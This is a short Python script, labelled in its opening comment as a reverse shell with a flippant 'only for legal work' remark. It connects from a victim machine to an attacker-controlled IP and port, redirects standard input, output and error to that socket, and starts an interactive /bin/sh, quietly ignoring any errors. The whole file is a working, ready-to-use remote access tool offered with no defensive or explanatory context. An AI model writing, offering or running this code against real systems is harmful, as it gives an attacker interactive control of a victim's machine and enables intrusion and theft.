#this is a reverse shell create a tcp connection from to victim machine to the 
#attacker machine .this i only for leagl work lol ok gays
import socket
import subprocess
import os

# Replace with your attacker's IP and port
ATTACKER_IP = "192.168.1.100"  # Change this to your attacker's IP
ATTACKER_PORT = 4444           # Change this to your desired port

def reverse_shell():
    try:
        # Connect back to the attacker
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ATTACKER_IP, ATTACKER_PORT))
        
        # Redirect standard input, output, and error to the socket
        os.dup2(s.fileno(), 0)  # stdin
        os.dup2(s.fileno(), 1)  # stdout
        os.dup2(s.fileno(), 2)  # stderr
        
        # Execute a shell
        subprocess.call(["/bin/sh", "-i"])
    except Exception as e:
        pass

if __name__ == "__main__":
    reverse_shell()

